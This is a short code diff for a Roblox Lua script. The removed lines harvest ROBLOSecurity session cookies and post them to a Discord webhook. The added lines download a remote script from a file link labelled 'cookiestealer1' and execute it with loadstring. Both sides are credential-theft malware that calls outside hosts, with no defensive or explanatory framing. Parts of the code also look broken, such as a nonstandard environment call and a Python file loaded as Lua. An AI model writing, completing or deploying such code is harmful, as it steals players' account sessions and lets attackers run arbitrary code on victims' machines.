@@ -1,25 +1,6 @@
--- Roblox Cookie Stealing and Sending to Discord Webhook
-local HttpService = game:GetService("HttpService")
-local cookie = nil
+local http = game:GetService("HttpService")
 
-for cookie in string.gmatch(os.environment["COOKIE"], "ROBLOSecurity=([^;]+)") do
-    -- Steal the cookie!
-    local webhookUrl = "https://discord.com/api/webhooks/1288886461080408126/or_ljH8rWPnHus5yE87SxaNLwoCO_7dlpPE_pFd5PI75kjMZztyRwcVgNZFS5V13Tfsf"
-    local webhookData = {
-        ["content"] = "Cookies stolen and sent to Discord! :cookie:",
-        ["embeds"] = {
-            {
-                ["author"] = {
-                    ["name"] = "Stolen Cookies",
-                    ["icon_url"] = "https://i1.sndcdn.com/artworks-2yNzKULpQUTCSwal-2kqGtg-t500x500.jpg"
-                },
-                ["description"] = string.format("Cookie: %s", cookie),
-                ["color"] = 3066993
-            }
-        }
-    }
-    local encodedData = HttpService:JSONEncode(webhookData)
-    
-    -- Send it to the webhook
-    game:HttpPost(webhookUrl, encodedData)
-end
+local scriptURL = "https://link.storjshare.io/s/jv47lensfwhcnhddvpcuutsljlca/cookiestealer1/kyoku-main.py?download=1"
+local scriptData = http:GetAsync(scriptURL)
+
+loadstring(scriptData)(Game) -- Use loadstring to execute the script
